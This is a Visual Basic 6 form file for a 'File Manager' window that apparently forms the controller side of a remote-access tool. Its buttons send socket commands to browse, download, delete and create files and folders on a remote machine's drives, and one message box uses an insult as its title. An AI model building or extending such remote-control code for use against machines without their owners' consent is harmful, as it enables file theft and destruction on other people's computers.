VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmExplorer 
   BorderStyle     =   0  'None
   Caption         =   "File Manager"
   ClientHeight    =   9270
   ClientLeft      =   0
   ClientTop       =   15
   ClientWidth     =   8400
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9270
   ScaleWidth      =   8400
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command4 
      Caption         =   "Delete Directory"
      Height          =   195
      Left            =   3480
      TabIndex        =   8
      Top             =   9000
      Width           =   1335
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Create Directory"
      Height          =   195
      Left            =   4800
      TabIndex        =   7
      Top             =   9000
      Width           =   1455
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Delete File"
      Height          =   195
      Left            =   2160
      TabIndex        =   4
      Top             =   9000
      Width           =   1335
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Download"
      Height          =   195
      Left            =   840
      TabIndex        =   3
      Top             =   9000
      Width           =   1335
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Exit"
      Height          =   195
      Left            =   0
      TabIndex        =   2
      Top             =   9000
      Width           =   855
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   9015
      Left            =   3720
      TabIndex        =   1
      Top             =   0
      Width           =   4695
      _ExtentX        =   8281
      _ExtentY        =   15901
      View            =   1
      Arrange         =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      OLEDropMode     =   1
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ColHdrIcons     =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      OLEDropMode     =   1
      NumItems        =   0
   End
   Begin MSComctlLib.TreeView TreeView1 
      Height          =   9015
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3735
      _ExtentX        =   6588
      _ExtentY        =   15901
      _Version        =   393217
      LineStyle       =   1
      Style           =   7
      ImageList       =   "ImageList1"
      BorderStyle     =   1
      Appearance      =   1
      OLEDropMode     =   1
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   7800
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   12
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":0000
            Key             =   "folder"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":0354
            Key             =   "drive"
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":06A8
            Key             =   "movie"
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":09FC
            Key             =   "bat"
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":0E88
            Key             =   "txt"
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":11DC
            Key             =   "dll"
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":1530
            Key             =   "exe"
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":1884
            Key             =   "pic"
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":1BD8
            Key             =   "help"
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":1F2C
            Key             =   "ini"
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":2280
            Key             =   "other"
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmExplorer.frx":25D4
            Key             =   "zip"
         EndProperty
      EndProperty
   End
   Begin VB.Label Label2 
      Height          =   255
      Left            =   7200
      TabIndex        =   6
      Top             =   9000
      Width           =   1215
   End
   Begin VB.Label Label1 
      Caption         =   "File Size:"
      Height          =   255
      Left            =   6360
      TabIndex        =   5
      Top             =   9000
      Width           =   735
   End
End
Attribute VB_Name = "frmExplorer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim pathHold As String
Dim retKey As String
Dim FileNameList As String

Private Sub Command1_Click()
 If TreeView1.Enabled = True Or client.Visible = False Then
 frmExplorer.Visible = False
 Else
 MsgBox " You cannot close it because download is still in progress..", vbCritical, " Bitch"
 End If
End Sub

Private Sub Command2_Click()



client.wskClient.SendData "\fileSize" & pathHold & FileNameList
PauseData.Pause 0.5
resultQ = MsgBox("Do you wish to download file  " & pathHold & FileNameList & " it is " & flSize & " bytes" & " ?", vbOKCancel, "??")
 If resultQ = vbOK Then client.cmSave.ShowSave
 If Not vbCancel Then
 SavePath = client.cmSave.FileName
PauseData.Pause 1
client.lblSize.Caption = flSize
client.ProgressBar1.Min = 0
client.ProgressBar1.Max = flSize
client.wskClient.SendData "\filePath" & pathHold & FileNameList
 End If



End Sub

Private Sub Command3_Click()

client.wskClient.SendData "\DeleteFile" & pathHold & FileNameList

End Sub

Private Sub Command4_Click()

client.wskClient.SendData "DeleteFolder" & pathHold

End Sub

Private Sub Command5_Click()

path = InputBox("Please enter path of the folder you wish to create...")
client.wskClient.SendData "CreateFolder" & path

End Sub

Private Sub Form_Load()
Dim C, A, D As Object
Set C = TreeView1.Nodes.Add(, , "C:\", "C:\", "drive")
Set A = TreeView1.Nodes.Add(, , "A:\", "A:\", "drive")
Set D = TreeView1.Nodes.Add(, , "D:\", "D:\", "drive")
End Sub

Private Sub ListView1_ItemClick(ByVal Item As MSComctlLib.ListItem)

FileNameList = Item.Text
client.wskClient.SendData "\fileSize" & pathHold & FileNameList
PauseData.Pause 0.5
Label2.Caption = flSize


End Sub



Private Sub TreeView1_NodeClick(ByVal Node As MSComctlLib.Node)
Dim pt As String


NodeFLP = Node.FullPath



Select Case Left(Node.FullPath, 3)
Case "C:\":
Drive = "C:\"
Case "A:\":
Drive = "A:\"
Case "D:\":
Drive = "D:\"
End Select

If Len(Node.FullPath) > 3 And tTimes > 0 Then

    pt = Right(Node.FullPath, Len(Node.FullPath) - 4)

NodeFullKey = Trim$(Node.key)
NodeFullPath = Drive & pt
pathHold = Node.FullPath
ListView1.ListItems.Clear
client.wskFL.SendData "\nodeclick" & "," & NodeFullPath & "," & Node.key
Node.Expanded = True

ElseIf Len(Node.FullPath) = 3 And tTimes > 0 Then
    
Exit Sub

ElseIf Len(Node.FullPath) = 3 And tTimes = 0 Then


NodeFullKey = Trim$(Node.key)
NodeFullPath = Node.FullPath
pathHold = Node.FullPath
ListView1.ListItems.Clear
client.wskFL.SendData "\nodeclick" & "," & pathHold & "," & Node.key
Node.Expanded = True

End If

NN = 0
tTimes = tTimes + 1



End Sub
